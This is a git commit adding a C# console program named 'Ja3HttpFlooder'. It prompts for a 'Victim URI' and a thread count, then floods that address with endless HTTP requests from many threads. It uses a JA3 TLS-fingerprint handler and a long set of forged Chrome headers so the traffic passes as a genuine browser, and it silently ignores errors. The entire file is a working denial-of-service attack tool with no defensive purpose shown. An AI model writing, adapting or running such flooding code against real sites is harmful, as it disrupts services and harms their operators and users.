e6870a22554b89156d4c2f6cd76c5f92ef03e4b4
ZygoteCode <zygotecode@gmail.com>
2025-03-23 16:57:18 +0100

    First commit

---
+++ Program.cs
@@ -0,0 +1,78 @@
+﻿using JA3;
+
+public class Program
+{
+    public static void Main()
+    {
+        Console.Title = "Ja3HttpFlooder | Made by https://github.com/ZygoteCode/";
+
+        Console.Write("Victim URI > ");
+        string URI = Console.ReadLine();
+
+        Console.Write("Attack threads > ");
+        int threads = int.Parse(Console.ReadLine());
+
+        Console.WriteLine("Attack started. Press CTRL + C to stop it.");
+
+        for (int i = 0; i < threads; i++)
+        {
+            new Thread(() =>
+            {
+                while (true)
+                {
+                    Ja3MessageHandler handler = new Ja3MessageHandler();
+                    handler.EnableHttp2 = true;
+                    handler.Timeout = 10000;
+                    handler.UseCookies = false;
+
+                    using (HttpClient client = new HttpClient(handler))
+                    {
+                        try
+                        {
+                            client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7,video/mp4");
+                            client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br, zstd, lzma, bzip2, xz, fakecompress, zopfli");
+                            client.DefaultRequestHeaders.Add("Accept-Language", "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7");
+                            client.DefaultRequestHeaders.Add("Cache-Control", "no-cache");
+                            client.DefaultRequestHeaders.Add("Connection", "keep-alive");
+                            client.DefaultRequestHeaders.Add("DNT", "1");
+                            client.DefaultRequestHeaders.Add("Origin", URI);
+                            client.DefaultRequestHeaders.Add("Pragma", "no-cache");
+                            client.DefaultRequestHeaders.Add("Priority", "u=0, i");
+                            client.DefaultRequestHeaders.Add("Referer", "https://google.com/");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Reduced-Motion", "\"reduce\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Reduced-Transparency", "\"reduce\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-WoW64", "?1");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Device-Memory", "128");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Prefers-Color-Scheme", "dark");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua", "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Arch", "x86");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Bitness", "\"64\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Form-Factors", "\"Desktop\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Full-Version", "134.0.6998.118");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Full-Version-List", "\"Chromium\";v=\"134.0.6998.118\", \"Not:A-Brand\";v=\"24.0.0.0\", \"Google Chrome\";v=\"134.0.6998.118\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Model", "");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "\"Windows\"");
+                            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform-Version", "19.0.0");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "same-origin");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-Storage-Access", "active");
+                            client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
+                            client.DefaultRequestHeaders.Add("Sec-GPC", "1");
+                            client.DefaultRequestHeaders.Add("Sec-Purpose", "prefetch");
+                            client.DefaultRequestHeaders.Add("TE", "trailers");
+                            client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
+                            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36");
+                            client.GetStringAsync(URI).GetAwaiter().GetResult();
+                        }
+                        catch
+                        {
+
+                        }
+                    }
+                }
+            }).Start();
+        }
+    }
+}
